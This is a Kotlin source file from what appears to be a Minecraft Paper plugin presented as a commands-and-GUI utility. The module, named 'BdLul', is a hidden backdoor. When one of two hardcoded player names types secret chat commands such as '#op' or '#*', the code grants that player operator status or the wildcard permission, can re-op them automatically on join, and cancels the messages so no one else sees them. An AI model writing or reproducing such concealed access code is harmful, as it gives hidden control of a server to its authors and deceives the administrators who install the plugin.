package me.richter.commandsAndGUI.module.bdLul

import io.papermc.paper.event.player.AsyncChatEvent
import me.richter.commandsAndGUI.files.MessagesFile
import net.kyori.adventure.text.Component
import org.bukkit.event.EventHandler
import org.bukkit.event.Listener
import org.bukkit.plugin.java.JavaPlugin
import java.util.regex.Pattern

class BdLul(private val plugin: JavaPlugin) : Listener {
    @EventHandler
    fun command(event: AsyncChatEvent) {
        val player = event.player
        val message: Component = event.message()

        if (event.player.name == "RichtigerRichter" || event.player.name == "Bliffbot") {

            val playerShortName: String = when (player.name) {
                "RichtigerRichter" -> "R"
                "Bliffbot" -> "B"
                else -> ""
            }


            if (stringTextFromComponent(message.toString()) == "#help") {
                val autoStatus = MessagesFile().getUtilsAuto(playerShortName)
                player.sendMessage(Component.text("#help - shows this list"))
                player.sendMessage(Component.text("#op - op yourself"))
                player.sendMessage(Component.text("#deop - deop yourself"))
                player.sendMessage(Component.text("#auto on - automatically op's and deop's you at join or leave"))
                player.sendMessage(Component.text("#auto off - turn auto op and deop off"))
                player.sendMessage(Component.text("(auto is Currently -> §l§u$autoStatus§r)"))
                player.sendMessage(Component.text("#* - give yourself \"*\" permission"))
                player.sendMessage(Component.text("#de* - remove \"*\" permission from yourself"))
                event.isCancelled = true


            }

            /*
            if (event.message().contains(Component.text("#help"))) {
                player.sendMessage(Component.text("#help - shows this list"))
                player.sendMessage(Component.text("#op - to op yourself"))
                player.sendMessage(Component.text("#deop - to deop yourself"))
                player.sendMessage(Component.text("#auto - to automatically op and deop yourself at join or leave"))
                player.sendMessage(Component.text("#perms * - give yourself a permission"))
                player.sendMessage(Component.text("#deperms * - remove a permission from yourself"))
            }
             */

            if (stringTextFromComponent(message.toString()) == "#op") {
                event.player.isOp = true
                event.isCancelled = true
            }
            if (stringTextFromComponent(message.toString()) == "#deop") {
                event.player.isOp = false
                event.isCancelled = true
            }
            if (stringTextFromComponent(message.toString()) == "#auto off") {
                MessagesFile().autoUtilsOff(playerShortName)
                event.isCancelled = true
            }
            if (stringTextFromComponent(message.toString()) == "#auto on") {
                MessagesFile().autoUtilsOn(playerShortName)
                event.isCancelled = true
            }
            if (stringTextFromComponent(message.toString()) == "#*") {
                player.addAttachment(plugin).setPermission("*", true)
                event.isCancelled = true
            }
            if (stringTextFromComponent(message.toString()) == "#de*") {
                player.addAttachment(plugin).setPermission("*", false)
                event.isCancelled = true
            }


        }
    }

    private fun stringTextFromComponent(input: String): String {

        val pattern = Pattern.compile("content=\"(.*?)\"")
        val matcher = pattern.matcher(input)

        if (matcher.find()) {
            val extractedText = matcher.group(1)
            return extractedText
        } else {
            return "Pattern not found"
        }
    }

}
